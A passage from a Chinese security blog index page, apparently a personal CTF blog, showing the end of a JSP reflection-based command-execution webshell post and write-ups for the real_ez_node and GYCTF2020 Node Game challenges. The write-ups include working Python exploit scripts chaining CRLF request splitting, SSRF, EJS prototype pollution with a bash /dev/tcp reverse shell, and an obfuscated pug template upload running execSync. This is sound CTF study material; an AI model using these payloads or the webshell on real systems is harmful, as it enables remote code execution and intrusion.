        Field helperpathField      = processClass.getDeclaredField(&quot;helperpath&quot;);
        launchMechanismField.setAccessible(true);
        helperpathField.setAccessible(true);
        Object launchMechanismObject = launchMechanismField.get(processObject);
        byte[] helperpathObject      = (byte[]) helperpathField.get(processObject);

        int ordinal = (int) launchMechanismObject.getClass().getMethod(&quot;ordinal&quot;).invoke(launchMechanismObject);

        Method forkMethod = processClass.getDeclaredMethod(&quot;forkAndExec&quot;, new Class[]&#123;
                int.class, byte[].class, byte[].class, byte[].class, int.class,
                byte[].class, int.class, byte[].class, int[].class, boolean.class
        &#125;);

        forkMethod.setAccessible(true);// 设置访问权限

        int pid = (int) forkMethod.invoke(processObject, new Object[]&#123;
                ordinal + 1, helperpathObject, toCString(strs[0]), argBlock, args.length,
                null, envc[0], null, std_fds, false
        &#125;);

        // 初始化命令执行结果，将本地命令执行的输出流转换为程序执行结果的输出流
        Method initStreamsMethod = processClass.getDeclaredMethod(&quot;initStreams&quot;, int[].class);
        initStreamsMethod.setAccessible(true);
        initStreamsMethod.invoke(processObject, std_fds);

        // 获取本地执行结果的输入流
        Method getInputStreamMethod = processClass.getMethod(&quot;getInputStream&quot;);
        getInputStreamMethod.setAccessible(true);
        InputStream in = (InputStream) getInputStreamMethod.invoke(processObject);

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        int                   a    = 0;
        byte[]                b    = new byte[1024];

        while ((a = in.read(b)) != -1) &#123;
            baos.write(b, 0, a);
        &#125;

        out.println(&quot;&lt;pre&gt;&quot;);
        out.println(baos.toString());
        out.println(&quot;&lt;/pre&gt;&quot;);
        out.flush();
        out.close();
    &#125;
%&gt;
</code></pre>

            
        </div>
    </div>
    <div class="post-tags">
        
        <span class="icon">
            <i class="fa-solid fa-tags fa-fw"></i>
        </span>
        
        
        
        <span class="tag">
            
            <a href="/tags/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/" style="color: #03a9f4">开发语言</a>
        </span>
        
        <span class="tag">
            
            <a href="/tags/java/" style="color: #ff7d73">java</a>
        </span>
        
        <span class="tag">
            
            <a href="/tags/%E4%BB%A3%E7%A0%81%E5%A4%8D%E5%AE%A1/" style="color: #ffa2c4">代码复审</a>
        </span>
        
    </div>
    <a href="/2024/01/27/JavaSec%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" class="go-post">阅读全文</a>
</div>

<div class="post">
    <a href="/2024/01/11/%E3%80%90%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%202022%E3%80%91real_ez_node%20%E5%A4%8D%E7%9B%98/">
        <h2 class="post-title">【西湖论剑 2022】real_ez_node 复盘</h2>
    </a>
    <div class="category-and-date">
        
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2024/1/11
        </span>
        
        
    </div>
    <div class="description">
        <div class="content" v-pre>
            
            <p>半年前说要学node 到现在还是b动静没有</p>
<h1 id="西湖论剑-2022-real-ez-node"><a href="#西湖论剑-2022-real-ez-node" class="headerlink" title="[西湖论剑 2022]real_ez_node"></a>[西湖论剑 2022]real_ez_node</h1><p>给了源码 node8.1.2<br>初步看下来要ssrf打原型链污染<br>&#x2F;路由下是<code>this is ejs</code><br>可以往ejs的原型链污染去考虑</p>
<p>但是问题来了<br>上哪儿去ssrf<br>&#x2F;curl路由只有参数q可控<br><img src="https://img-blog.csdnimg.cn/direct/8a843cd75bef4e78a75c81ce08b9fba1.png" alt="在这里插入图片描述"><br>考虑CRLF拆分攻击<br><img src="https://img-blog.csdnimg.cn/direct/0dfba27b3d2743ed899931ce9e02ed32.png" alt="在这里插入图片描述"><br>污染点在<br><img src="https://img-blog.csdnimg.cn/direct/b869e8c7b7f84993a0509f454af8a2c8.png" alt="在这里插入图片描述"><br>手动POST &#x2F;copy<br>拿到数据包删掉点无关紧要的东西<br>然后就可以构造了<br><code>_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;/bin/bash -c \\&quot;/bin/bash -i &gt;&amp;/dev/tcp/xxx.xxx.xxx.xxx/9000 0&gt;&amp;1\\&quot;&#39;);var __tmp2</code></p>
<pre><code class="py">import urllib.parse
import requests

payload = &#39;&#39;&#39;HTTP/1.1

POST /copy HTTP/1.1
Host: 127.0.0.1:3000
Content-Type: application/json
Content-Length: 192

&#123;&quot;constructor.prototype.outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;/bin/bash -c \\&quot;/bin/bash -i &gt;&amp;/dev/tcp/xxx.xxx.xxx.xxx/9000 0&gt;&amp;1\\&quot;&#39;);var __tmp2&quot;&#125;

GET /&#39;&#39;&#39;
payload = payload.replace(&#39; &#39;, &#39;\u0120&#39;).replace(&#39;\n&#39;, &#39;\u010d\u010a&#39;).replace(&#39;&#123;&#39;, &#39;\u017b&#39;).replace(
    &#39;&#125;&#39;, &#39;\u017d&#39;).replace(&#39;&quot;&#39;, &#39;\u0122&#39;).replace(&#39;\&#39;&#39;, &#39;\u0127&#39;).replace(&#39;&gt;&#39;, &#39;\u013e&#39;).replace(&#39;\\&#39;, &#39;\u015c&#39;)


payload = urllib.parse.quote(payload)

print(payload)
url = &quot;http://node4.anna.nssctf.cn:28814/curl?q=&quot;
requests.get(url+payload)
</code></pre>
<h1 id="GYCTF2020-Node-Game"><a href="#GYCTF2020-Node-Game" class="headerlink" title="[GYCTF2020]Node Game"></a>[GYCTF2020]Node Game</h1><p>这里顺便给[GYCTF2020]Node Game做了<br><img src="https://img-blog.csdnimg.cn/direct/47c756b052304c6383cfc905ecd55ef4.png" alt="在这里插入图片描述"><br>模板是pug<br>&#x2F;core可以ssrf<br>&#x2F;file_upload有一个文件上传<br>根路径下传action参数可以访问任意模板</p>
<p>那么可以考虑上传一个恶意的pug然后根目录去访问<br><img src="https://img-blog.csdnimg.cn/direct/a9724e2e618543718d45ea2641c48dc8.png" alt="在这里插入图片描述"><br>上传路径在uploads下 可以通过构造mimetype来路径穿越</p>
<p>先抓一个上传的包</p>
<pre><code class="c">- x = eval(&quot;glob&quot;+&quot;al.proce&quot;+&quot;ss.mainMo&quot;+&quot;dule.re&quot;+&quot;quire(&#39;child_&#39;+&#39;pro&#39;+&#39;cess&#39;)[&#39;ex&#39;+&#39;ecSync&#39;](&#39;ls&#39;)&quot;)
- return x
</code></pre>
<p>完事改脚本</p>
<pre><code class="py">import urllib.parse
import requests

# payload = &#39;&#39;&#39;HTTP/1.1

# POST /file_upload HTTP/1.1
# Host: 127.0.0.1:8081
# Content-Length: 331
# Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryCOrILUaqwgT7T9GT

# ------WebKitFormBoundaryCOrILUaqwgT7T9GT
# Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;shell.pug&quot;
# Content-Type: ../template

# -var x = eval(&quot;glob&quot;+&quot;al.proce&quot;+&quot;ss.mainMo&quot;+&quot;dule.re&quot;+&quot;quire(&#39;child_&#39;+&#39;pro&#39;+&#39;cess&#39;)[&#39;ex&#39;+&#39;ecSync&#39;](&#39;cat /flag.txt&#39;).toString()&quot;)
# -return x
# ------WebKitFormBoundaryCOrILUaqwgT7T9GT--

# GET /&#39;&#39;&#39;
payload =&#39;&#39;&#39;HTTP/1.1

POST /file_upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryO9LPoNAg9lWRUItA
Content-Length: 301
Host: 127.0.0.1:8081

------WebKitFormBoundaryO9LPoNAg9lWRUItA
Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;shell.pug&quot;
Content-Type: ../template

- x = eval(&quot;glob&quot;+&quot;al.proce&quot;+&quot;ss.mainMo&quot;+&quot;dule.re&quot;+&quot;quire(&#39;child_&#39;+&#39;pro&#39;+&#39;cess&#39;)[&#39;ex&#39;+&#39;ecSync&#39;](&#39;ls&#39;)&quot;)
- return x
------WebKitFormBoundaryO9LPoNAg9lWRUItA--


GET /&#39;&#39;&#39;
payload = payload.replace(&#39; &#39;, &#39;\u0120&#39;).replace(&#39;\n&#39;, &#39;\u010d\u010a&#39;).replace(&#39;&#123;&#39;, &#39;\u017b&#39;).replace(
    &#39;&#125;&#39;, &#39;\u017d&#39;).replace(&#39;&quot;&#39;, &#39;\u0122&#39;).replace(&#39;\&#39;&#39;, &#39;\u0127&#39;).replace(&#39;&gt;&#39;, &#39;\u013e&#39;).replace(&#39;\\&#39;, &#39;\u015c&#39;)


payload = urllib.parse.quote(payload)


url = &quot;http://4b5ed9ad-6e1e-4336-91a3-4bffc35ea376.node5.buuoj.cn:81/core?q=&quot;
print(url+payload)
res = requests.get(url+payload)
print(res.text)

</code></pre>
<p>此时访问&#x2F;?action&#x3D;shell<br><img src="https://img-blog.csdnimg.cn/direct/cf0c6324b4b3480fba39e1fa24c7b81f.png" alt="在这里插入图片描述"><br>修改pug</p>
<pre><code class="c">- x = eval(&quot;glob&quot;+&quot;al.proce&quot;+&quot;ss.mainMo&quot;+&quot;dule.re&quot;+&quot;quire(&#39;child_&#39;+&#39;pro&#39;+&#39;cess&#39;)[&#39;ex&#39;+&#39;ecSync&#39;](&#39;cat f*&#39;)&quot;)
- return x
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/direct/9cf32449b61c47eaaf37ace260ee67ab.png" alt="在这里插入图片描述"></p>

            
        </div>
    </div>
    <div class="post-tags">
        
        <span class="icon">
            <i class="fa-solid fa-tags fa-fw"></i>
        </span>
        
        
        
        <span class="tag">
            
            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #ffa2c4">网络安全</a>
        </span>
        
        <span class="tag">
            
            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #00a596">安全</a>
        </span>
        
        <span class="tag">
            
            <a href="/tags/node-js/" style="color: #ffa2c4">node.js</a>
        </span>
        
    </div>
    <a href="/2024/01/11/%E3%80%90%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%202022%E3%80%91real_ez_node%20%E5%A4%8D%E7%9B%98/" class="go-post">阅读全文</a>
</div>


        <div class="page-current">
    
    <span class="current">1</span>
    
    <a class="page-num" href="/page/2">2</a>
    
    
    <a class="page-num" href="/page/3">3</a>
    
    
    <span class="page-omit">...</span>
    <a class="page-num" href="/page/7">7</a>
    
    
    <a class="page-num" href="/page/2/">
        <i class="fa-solid fa-caret-right fa-fw"></i>
    </a>
    
</div>

    </div>
    
    <div id="home-card">
        <div id="card-style">
    <div id="card-div">
        <div class="avatar">
            <img src="/images/Arcueid.jpg" alt="avatar" />
        </div>
        <div class="name">Arcueid</div>
        <div class="description">
            <p>Web + Crypto 苦手</p>

        </div>
        
        
    </div>
</div>

    </div>
    
</div>

            <footer id="footer">
    <div id="footer-wrap">
        <div>
            &copy;
            2022 - 2024 Arcueid&#39;s BLOG
            <span id="footer-icon">
                <i class="fa-solid fa-font-awesome fa-fw"></i>
            </span>
            &commat;Arcueid
        </div>
        <div>
            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
        </div>
        
    </div>
</footer>

        </div>
        
        <transition name="fade">
            <div id="preview" ref="preview" v-show="previewShow">
                <img id="preview-content" ref="previewContent" />
            </div>
        </transition>
        
    </div>
    <script src="/js/main.js"></script>
    
</body>
</html>
